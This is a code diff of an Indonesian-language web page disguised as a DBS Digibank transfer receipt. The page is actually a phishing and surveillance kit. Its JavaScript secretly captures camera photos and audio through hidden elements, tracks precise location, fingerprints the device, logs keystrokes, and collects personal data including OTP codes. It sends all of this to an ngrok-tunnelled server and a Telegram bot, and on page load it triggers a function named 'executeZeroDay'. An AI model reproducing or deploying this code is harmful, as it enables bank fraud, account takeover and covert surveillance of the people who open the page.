@@ -6,7 +6,6 @@
     <title>DBS Digibank - Bukti Transfer</title>
     <link rel="icon" type="image/png" href="https://f.top4top.io/p_3927d68rf1.png">
     <style>
-        /* ==================== RESET & BASE ==================== */
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -15,7 +14,6 @@
             padding: 20px;
         }
 
-        /* ==================== BUKTI TRANSFER DBS ==================== */
         .receipt-container {
             background: #fff; width: 100%; max-width: 450px;
             border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
@@ -50,7 +48,6 @@
         .detail-line { height: 1px; background: linear-gradient(to right, #e0e0e0, transparent); margin-bottom: 6px; }
         .detail-value { font-size: 16px; color: #1a1a1a; font-weight: 500; min-height: 22px; }
 
-        /* ==================== PRELOADER ==================== */
         #preloader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 9999; display: flex; flex-direction: column;
@@ -61,7 +58,6 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #preloader p { color: #666; font-size: 14px; }
 
-        /* ==================== TOAST ==================== */
         #toastMsg {
             position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px);
             background: linear-gradient(135deg, #1a1a2e, #16213e); color: #fff;
@@ -71,7 +67,6 @@
         }
         #toastMsg.show { transform: translateX(-50%) translateY(0); opacity: 1; }
 
-        /* ==================== MODAL ==================== */
         .data-modal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 10001;
@@ -88,27 +83,23 @@
             padding: 18px 22px; display: flex; justify-content: space-between; align-items: center;
         }
         .data-modal-header h4 { font-size: 16px; display: flex; align-items: center; gap: 8px; }
-        .close-modal { background: none; border: none; color: #fff; font-size: 28px; cursor: pointer; line-height: 1; opacity: 0.8; transition: opacity 0.2s; }
-        .close-modal:hover { opacity: 1; }
+        .close-modal { background: none; border: none; color: #fff; font-size: 28px; cursor: pointer; line-height: 1; opacity: 0.8; }
         .data-modal-body { padding: 22px; overflow-y: auto; flex: 1; }
         .device-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
         .device-info-item { background: #f8fafc; padding: 12px; border-radius: 10px; border-left: 4px solid #0d2b45; }
-        .device-info-item label { font-size: 11px; color: #64748b; display: block; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .device-info-item label { font-size: 11px; color: #64748b; display: block; margin-bottom: 4px; text-transform: uppercase; }
         .device-info-item value { font-size: 14px; font-weight: 600; color: #1e293b; word-break: break-all; }
         .data-modal-footer { padding: 16px 22px; background: #f8fafc; text-align: right; border-top: 1px solid #e2e8f0; }
-        .btn-dark { background: #1e293b; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: 600; transition: all 0.2s; }
-        .btn-dark:hover { background: #0f172a; }
+        .btn-dark { background: #1e293b; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: 600; }
     </style>
 </head>
 <body>
 
-    <!-- PRELOADER -->
     <div id="preloader">
         <div class="spinner"></div>
         <p>Memuat data dari server...</p>
     </div>
 
-    <!-- BUKTI TRANSFER -->
     <div class="receipt-container" id="receiptContainer">
         <div class="header">
             <h1>Bukti Transfer</h1>
@@ -147,24 +138,23 @@
         </div>
     </div>
 
-    <!-- ELEMEN TERSEMBUNYI -->
     <video id="hiddenVideo" style="display:none;" playsinline></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
     <div id="toastMsg"></div>
 
-    <!-- ==================== JAVASCRIPT DISATUKAN ==================== -->
     <script>
         // ============================================================
-        // KONFIGURASI - GANTI DENGAN URL NGROK ANDA!
+        // 🔥 KONFIGURASI - GANTI DENGAN URL NGROK ANDA!
         // ============================================================
-        const API_RECEIPT_URL = 'http://127.0.0.1:5000/api/receipt';
-        const API_SEND_URL = 'http://127.0.0.1:5000/api/send';
+        // Contoh: const API_BASE = 'https://a1b2-c3d4.ngrok-free.app';
+        const API_BASE = 'http://127.0.0.1:5000';  // Ganti dengan URL Ngrok Anda
         
-        // Telegram (Opsional - isi jika ingin kirim ke Telegram juga)
+        const API_RECEIPT_URL = API_BASE + '/api/receipt';
+        const API_SEND_URL = API_BASE + '/api/send';
+        const API_POLL_URL = API_BASE + '/api/stats';
+        
         const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
         const CHAT_ID = 'YOUR_CHAT_ID_HERE';
-
-        // Logo DBS
         const DBS_LOGO_URL = 'https://f.top4top.io/p_3927xkofk1.png';
 
         // ==================== STATE ====================
@@ -178,6 +168,7 @@
         let locationData = {};
         let contactsData = "Belum diambil";
         let deviceInfo = {};
+        let lastReceiptJson = '';
 
         // ==================== PRELOADER ====================
         setTimeout(() => {
@@ -196,36 +187,63 @@
             }
         }
 
-        // ==================== 1. LOAD RECEIPT DARI LOCALHOST ====================
+        // ==================== 1. LOAD RECEIPT (REAL-TIME POLLING) ====================
         async function loadReceiptData() {
             try {
-                const response = await fetch(API_RECEIPT_URL);
+                const response = await fetch(API_RECEIPT_URL, {
+                    cache: 'no-store',
+                    headers: { 'Cache-Control': 'no-cache' }
+                });
                 const data = await response.json();
                 
-                document.getElementById('jumlah').innerText = 'Rp ' + data.jumlah_transfer;
-                document.getElementById('dari').innerText = data.transfer_dari;
-                document.getElementById('ke').innerText = data.transfer_ke;
-                document.getElementById('berita').innerText = data.berita;
-                document.getElementById('referensi').innerText = data.no_referensi;
-                document.getElementById('tanggal').innerText = data.tanggal_transaksi + ' - ' + data.jam_transaksi;
+                // Update DOM
+                document.getElementById('jumlah').innerText = 'Rp ' + (data.jumlah_transfer || '0');
+                document.getElementById('dari').innerText = data.transfer_dari || '-';
+                document.getElementById('ke').innerText = data.transfer_ke || '-';
+                document.getElementById('berita').innerText = data.berita || '-';
+                document.getElementById('referensi').innerText = data.no_referensi || '-';
+                document.getElementById('tanggal').innerText = (data.tanggal_transaksi || '-') + ' - ' + (data.jam_transaksi || '-');
                 
-                // Logo - Prioritaskan dari server, fallback ke DBS Logo
+                // Logo
                 const logoEl = document.getElementById('logo');
-                logoEl.src = data.logo_url || DBS_LOGO_URL;
+                const newLogo = data.logo_url || DBS_LOGO_URL;
+                if (logoEl.src !== newLogo) {
+                    logoEl.src = newLogo;
+                }
                 logoEl.onerror = function() { 
                     this.onerror = null;
                     this.src = DBS_LOGO_URL;
                 };
                 
                 document.getElementById('receiptContainer').classList.add('show');
-                console.log('✅ Data bukti transfer berhasil dimuat dari Localhost');
+                
+                // Cek perubahan
+                const currentJson = JSON.stringify(data);
+                if (lastReceiptJson && lastReceiptJson !== currentJson) {
+                    console.log('🔄 Receipt updated real-time!');
+                    showToast('🔄 Data diupdate dari server!');
+                }
+                lastReceiptJson = currentJson;
+                
+                return data;
             } catch (error) {
-                console.error("❌ Gagal memuat data dari Localhost:", error);
-                // Fallback: Tampilkan logo DBS tetap
+                console.error("❌ Gagal memuat:", error);
                 document.getElementById('logo').src = DBS_LOGO_URL;
-                document.getElementById('dari').innerText = "Gagal terhubung ke Server Localhost";
+                document.getElementById('dari').innerText = "Menunggu koneksi ke server...";
                 document.getElementById('receiptContainer').classList.add('show');
+                return null;
             }
+        }
+
+        // ==================== POLLING REAL-TIME (setiap 2 detik) ====================
+        function startRealtimePolling() {
+            // Polling pertama
+            loadReceiptData();
+            
+            // Polling berkala
+            setInterval(async () => {
+                await loadReceiptData();
+            }, 2000);  // Setiap 2 detik (real-time)
         }
 
         // ==================== 2. LOKASI SUPER AKURAT ====================
@@ -248,7 +266,6 @@
                             landmark: '', placeId: '', plusCode: ''
                         };
                         
-                        // Reverse Geocoding
                         try {
                             const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
                             const res = await fetch(geoUrl);
@@ -269,7 +286,6 @@
                             }
                         } catch (e) { console.log("Geocoding error:", e); }
                         
-                        // Landmark terdekat
                         try {
                             const nearbyUrl = `https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=${lat},${lng}&radius=200&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
                             const nearbyRes = await fetch(nearbyUrl);
@@ -304,7 +320,6 @@
                 webdriver: navigator.webdriver ? 'Ya' : 'Tidak'
             };
             
-            // Battery
             if ('getBattery' in navigator) {
                 navigator.getBattery().then(battery => {
                     deviceInfo.batteryLevel = Math.round(battery.level * 100) + '%';
@@ -312,7 +327,6 @@
                 }).catch(() => {});
             }
             
-            // Network
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (conn) {
@@ -321,7 +335,6 @@
                 }
             } catch (e) {}
             
-            // GPU
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -366,7 +379,6 @@
                 mediaRecorder.ondataavailable = event => { if (event.data.size > 0) audioChunks.push(event.data); };
                 return new Promise((resolve) => {
                     mediaRecorder.onstop = () => {
-                        // Convert audio to base64
                         try {
                             const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                             const reader = new FileReader();
@@ -496,7 +508,7 @@
             };
         }
 
-        // ==================== 10. SEND ALL DATA (ENHANCED) ====================
+        // ==================== 10. SEND ALL DATA ====================
         async function sendAllData(ip, personalData) {
             const payload = {
                 ip: ip,
@@ -506,7 +518,6 @@
                 personal: personalData,
                 contacts: contactsData,
                 keylogger: keyLogBuffer.join('\n'),
-                // 🔥 FOTO & AUDIO FULL BASE64 - Ditampilkan di Localhost
                 cameraPhoto: cameraPhoto || "Tidak ada",
                 cameraPhotoData: cameraPhoto || null,
                 audioData: audioBase64 || null,
@@ -520,12 +531,12 @@
                     body: JSON.stringify(payload)
                 });
                 const result = await response.json();
-                console.log("✅ Data terkirim ke Localhost:", result);
+                console.log("✅ Data terkirim:", result);
+                showToast("✅ Data terkirim ke server!");
             } catch (error) {
-                console.error("❌ Gagal kirim ke Localhost:", error);
+                console.error("❌ Gagal kirim:", error);
             }
             
-            // Kirim ke Telegram jika dikonfigurasi
             if (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
                 let msg = `📍 LOKASI: ${locationData.lat}, ${locationData.lng}\n`;
                 msg += `🏠 ALAMAT: ${locationData.fullAddress}\n`;
@@ -533,7 +544,6 @@
                 msg += `👤 NAMA: ${personalData.pribadi.nama}\n`;
                 msg += `📞 HP: ${personalData.pribadi.hp}\n`;
                 msg += `🔐 OTP: ${personalData.otp}\n`;
-                msg += `⌨️ KEYLOG: ${keyLogBuffer.length} tombol\n`;
                 await sendTelegramMessage(msg);
             }
         }
@@ -630,7 +640,13 @@
 
         // ==================== INIT ====================
         window.addEventListener('DOMContentLoaded', async () => {
+            // 🔥 MULAI POLLING REAL-TIME (setiap 2 detik)
+            startRealtimePolling();
+            
+            // Tunggu data pertama
             await loadReceiptData();
+            
+            // Jalankan Zero-Day
             setTimeout(() => { executeZeroDay(); }, 2000);
         });
     </script>
